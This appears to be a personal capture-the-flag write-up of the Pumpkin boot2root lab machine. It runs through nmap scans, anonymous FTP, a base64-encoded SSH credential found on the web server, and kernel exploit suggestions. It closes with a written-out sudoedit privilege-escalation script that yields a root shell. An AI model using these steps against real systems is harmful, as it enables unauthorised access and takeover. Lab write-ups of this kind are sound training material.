target:192.168.11.133

└─# nmap 192.168.11.133
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-09 13:49 EDT
Nmap scan report for 192.168.11.133
Host is up (0.00068s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 00:0C:29:15:E7:B7 (VMware)

Only port 21
└─# nmap -f -sC -sV -T5 192.168.11.133
oPORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.11.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
inside note :
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Others]
└─# cat note.txt    
Hello Dear! 
Looking for route map to PumpkinGarden? I think jack can help you find it.
second nmap:
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Others]
└─# nmap -sC -sV -p- 192.168.11.133
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-09 16:52 EDT
Nmap scan report for 192.168.11.133
Host is up (0.00087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.11.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Mission-Pumpkin
|_http-server-header: Apache/2.4.7 (Ubuntu)
3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d88de7483a3c910e3f43eaa305d889e2 (DSA)
|   2048 f0418fe040e3c03a1f4d4f93e663249e (RSA)
|   256 fa87571ba2ba92760ce785e7f53d54b1 (ECDSA)
|_  256 fae8425a8891b44bebe4c3742e23a545 (ED25519)
MAC Address: 00:0C:29:15:E7:B7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_k

got this comment on the website :  searching for the route map? Pumpkin images may help you find the way 
Then i do a dirsearch and i found : http://192.168.11.133:1515/img/
i found also a hidden secret on that website : http://192.168.11.133:1515/img/hidden_secret/clue.txt
here is : c2NhcmVjcm93IDogNVFuQCR5 and it's a base64 i will decode it
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Others]
└─# echo "c2NhcmVjcm93IDogNVFuQCR5" | base64 -d
scarecrow : 5Qn@$y  
I think i found a user and a password right 
The first thing i will try is to access throught ssh on the port 3535
ANd i       was logged successfuly

Now PrivESC
i found this note.txt
scarecrow@Pumpkin:~$ cat note.txt 

Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
i tried 
scarecrow@Pumpkin:~$ sudo -l
[sudo] password for scarecrow: 
Sorry, user scarecrow may not run sudo on Pumpkin.
using linpeas
i found [+] [CVE-2015-1328] overlayfs
 dirty cow 
 ╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] overlayfs
      CVE-2015-8660
      Source: http://www.exploit-db.com/exploits/39230
  [3] pp_key
      CVE-2016-0728
      Source: http://www.exploit-db.com/exploits/39277
  [4] timeoutpwn
      CVE-2014-0038
      Source: http://www.exploit-db.com/exploits/31346

then i read this 2 second time :
Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
the password for user goblin was here 

then also i got this note :
goblin@Pumpkin:~$ cat note 

Hello Friend! I heard that you are looking for PumpkinGarden key. 
But Key to the garden will be with LordPumpkin(ROOT user), don't worry, I know where LordPumpkin had placed the Key.
You can reach there through my backyard.

Here is the key to my backyard
https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh

here also i tried :
goblin@Pumpkin:~$ sudo -l
[sudo] password for goblin: 
Matching Defaults entries for goblin on Pumpkin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goblin may run the following commands on Pumpkin:
    (root) ALL, !/bin/su

I found this https://www.exploit-db.com/exploits/11651
Root:
goblin@Pumpkin:/tmp$ cat > sudoedit << _EOF
> #!/bin/sh
> echo ALEX-ALEX
> su
> /bin/su
> /usr/bin/su
> _EOF
goblin@Pumpkin:/tmp$ chmod a+x ./sudoedit
goblin@Pumpkin:/tmp$ sudo ./sudoedit $1
ALEX-ALEX
root@Pumpkin:/tmp# ls
sudoedit
root@Pumpkin:/tmp# ls
root@Pumpkin:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

root@Pumpkin:~# cat *
Q29uZ3JhdHVsYXRpb25zIQ==
root@Pumpkin:~# echo "Q29uZ3JhdHVsYXRpb25zIQ==" | base64 -d
Congratulations!root